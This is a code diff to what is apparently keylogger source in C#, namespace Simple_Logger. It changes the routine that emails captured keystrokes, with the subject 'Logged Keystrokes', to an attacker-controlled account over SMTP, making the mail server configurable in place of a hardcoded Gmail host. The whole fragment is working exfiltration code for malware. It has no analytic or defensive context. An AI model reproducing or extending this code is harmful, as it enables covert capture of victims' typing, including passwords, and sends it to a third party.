@@ -1,6 +1,4 @@
-﻿using System;
-using System.Configuration;
-using System.Net;
+﻿using System.Configuration;
 using System.Net.Mail;
 
 namespace Simple_Logger
@@ -13,6 +11,10 @@ namespace Simple_Logger
 
             var email = new MailMessage(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["email"]);
 
+            // Set the smtp server
+
+            client.Host = ConfigurationManager.AppSettings["service"];
+
             // Use TSL port
 
             client.Port = 587;
@@ -22,10 +24,6 @@ namespace Simple_Logger
             client.UseDefaultCredentials = false;
 
             client.Credentials = new System.Net.NetworkCredential(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["password"]);
-
-            // Gmails smtp server
-
-            client.Host = "smtp.gmail.com";
 
             email.Subject = "Logged Keystrokes";
             email.Body = keystrokes;
